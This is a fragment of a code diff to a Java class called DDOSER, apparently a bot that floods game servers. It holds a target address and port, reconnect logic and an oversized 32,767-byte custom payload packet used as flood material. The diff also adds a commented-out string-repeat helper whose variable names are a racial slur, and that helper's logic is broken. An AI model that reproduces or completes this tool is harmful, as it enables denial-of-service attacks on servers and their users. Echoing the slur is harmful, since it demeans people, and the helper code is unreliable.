@@ -33,7 +33,7 @@ public class DDOSER extends Thread {
 	private static final LogAgent logger = new LogAgent("DDOSER", " [DDOSER]", (new File("ddoser.log")).getAbsolutePath());
 	
 	private static final byte[] emptyArray = new byte[32767];
-	private static final Packet emptyPacket = new Packet250CustomPayload(" ".repeat(20), emptyArray);
+	private static final Packet emptyPacket = new Packet250CustomPayload(/*(repeatStr(" ",20)*/"                    ", emptyArray);
 	
 	private static final boolean RECONNECT = true;
 	
@@ -48,14 +48,20 @@ public class DDOSER extends Thread {
 	public String getUsername() {
 		return name;
 	}
-
 	boolean running, logged;
 
 	private TcpConnection connection;
 	
 	private final InetAddress address;
 	private final int port;
-	
+
+
+/*	public static String repeatStr(String str, int nig) {
+		String repeater = str;
+		for (int nigga = 0;nigga < nig;nigga++) repeater += repeater;
+		return repeater;
+	}*/
+
 	public DDOSER(String name, InetAddress address, int port) {
 		this.name = name;
 		this.address = address;
